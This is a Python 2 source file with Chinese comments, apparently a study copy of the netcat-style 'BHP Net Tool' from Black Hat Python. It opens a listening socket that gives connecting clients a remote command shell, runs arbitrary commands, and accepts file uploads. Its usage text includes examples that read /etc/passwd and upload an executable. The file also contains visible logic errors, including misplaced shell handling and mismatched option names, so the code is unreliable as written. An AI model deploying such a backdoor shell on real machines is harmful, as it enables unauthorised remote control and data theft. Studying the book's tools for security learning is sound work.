#coding:utf-8
"""
    this is a program in black hat python
"""
import sys
import socket
import getopt
import threading
import subprocess

#全局变量
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#命令行参数
def usage():
    print 'BHP Net Tool'
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen"

    print "-e --execute=file_to_run"

    print "-c --command"
    print "-u --upload=destination"

    print
    print

    print "Examples:"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


# 客户端发送数据
def client_sender(buffer):
    #创建TCP套接字
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #连接到目标IP和端口
        client.connect((target, port))
        #如果有数据,发送数据
        if len(buffer):
            client.send(buffer)
        #持续接受数据直到数据接收完毕
        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print response
            #等待输入
            buffer = raw_input("")
            buffer += "\n"
            #发送输入数据
            client.send(buffer)
    except:
        print "[*] Exception! Exiting."
    client.close()


# 服务器端监听
def server_loop():
    global target
    #如果没有目标,接收所有IP
    if not len(target):
        target = "0.0.0.0"
    #创建TCP套接字
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #绑定目标
    server.bind((target, port))
    #设置最大连接数
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        #创建新线程来处理客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


# 执行命令
def run_command(command):
    #删除命令末尾的空格
    command = command.rstrip()
    #发送命令并返回输出
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Faild to execute command.\r\n"

    return output


# 保存接收到的数据
def client_handler(client_socket):
    global upload
    global execute
    global command
    
    #检测上传文件
    if len(upload_destination):
        
        file_buffer = ""
        #持续接受数据
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        #保存接收到的数据
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
        #如果有命令,执行命令
        if len(execute):
            output = run_command(execute)
            client_socket.send(output)
        #创建新的shell
        if command:
            while True:
                client_socket.send("<BHP:#> ")

                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)
                    response = run_command(cmd_buffer)
                    client_socket.send(response)

#主函数
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    #没有额外命令，调用
    if not len(sys.argv[1:]):
        usage()

    #参数读取错误
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                  ["help", "listen", "execute", "target", "port", "command", "upload"])
        print 'opts', opts
    except getopt.GetoptError as err:
        print str(err)
        usage()

    #读取参数并赋值
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    print 'listen', listen
    print 'execute', execute
    print  'command', command
    print 'upload_destination', upload_destination
    print 'target', target
    print 'port', port

    #不监听仅从标准输入发送数据
    if not listen and len(target) and port > 0:
        print 'not listen'
        buffer = sys.stdin.read()
        print 'buffer', buffer
        client_sender(buffer)
    #监听
    if listen:
        server_loop()

main()







































